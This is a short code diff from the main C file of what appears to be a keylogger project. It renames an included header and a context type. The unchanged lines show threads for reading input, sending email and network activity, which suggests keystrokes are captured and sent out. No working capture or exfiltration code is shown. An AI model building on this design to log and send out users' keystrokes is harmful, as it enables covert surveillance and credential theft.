@@ -5,12 +5,12 @@
 #include <unistd.h>
 #include <locale.h>
 #include "core_state.h"
-#include "utils/helpers.h"
+#include "utils/time_utils.h"
 #include "keylogger/keylogger.h"
 #include "network/network.h"
 
 int main() {
-    HandlerContext context;
+    KeyloggerContext context;
     pthread_t thread_read, thread_send_email, thread_network;
     void *retval_read, *retval_send, *retval_net;
     int code_read, code_send, code_net;
